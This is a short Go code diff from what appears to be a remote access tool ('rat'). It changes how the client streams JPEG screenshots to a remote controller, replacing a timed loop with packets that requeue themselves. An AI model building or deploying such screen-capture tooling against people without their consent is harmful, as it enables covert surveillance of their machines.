@@ -5,7 +5,6 @@ import (
 	"image/jpeg"
 	"rat/client/screen"
 	"rat/common"
-	"time"
 )
 
 var screenStream bool
@@ -22,11 +21,11 @@ func (packet ScreenPacket) GetHeader() common.PacketHeader {
 func (packet ScreenPacket) Read(c *Connection) error {
 	run, err := c.ReadBool()
 
+	screenStream = run
+
 	if run {
-		screenStream = true
-		go ScreenStream()
-	} else {
-		screenStream = false
+		// Dispatch one screen packet
+		Queue <- ScreenPacket{}
 	}
 
 	return err
@@ -44,13 +43,12 @@ func (packet ScreenPacket) Write(c *Connection) error {
 	c.WriteInt(len(w.Bytes()))
 	c.Write(w.Bytes())
 
-	return nil
-}
-
-// ScreenStream goroutine
-func ScreenStream() {
-	for screenStream {
-		Queue <- ScreenPacket{}
-		time.Sleep(common.ScreenStreamWait)
+	// Send another screen packet if we're still streaming
+	if screenStream {
+		go func() {
+			Queue <- ScreenPacket{}
+		}()
 	}
+
+	return nil
 }
